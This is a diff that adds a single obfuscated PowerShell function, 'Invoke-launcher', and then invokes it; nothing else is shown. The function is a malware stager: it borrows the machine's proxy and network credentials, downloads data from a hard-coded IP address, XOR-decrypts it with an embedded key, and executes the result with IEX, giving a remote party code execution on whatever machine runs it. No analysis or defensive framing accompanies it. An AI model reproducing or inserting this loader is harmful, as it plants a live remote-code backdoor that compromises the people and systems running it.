@@ -1,0 +1,4 @@
+function Invoke-launcher
+{
+[SySteM.NET.SeRviCEPOIntMAnAgEr]::EXPeCt100CONTinue = 0;$Wc=NEW-ObJECt SySteM.Net.WEBClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaDERs.ADd('User-Agent',$u);$wc.PrOXy = [System.NEt.WEBReQUEST]::DeFaULTWEbPRoxY;$wc.PROXY.CrEDENtIALS = [System.NeT.CredentIaLCachE]::DeFauLTNetWORkCREdEntIALS;$K='B~4!Mt>L0<G]u%1*$T#a|hV5dXyNnPzC';$I=0;[cHar[]]$B=([cHAR[]]($wc.DoWNLOAdSTrING("http://87.63.241.178:8080/index.asp")))|%{$_-bXOr$K[$I++%$K.LENGtH]};IEX ($b-Join'')
+}Invoke-launcher
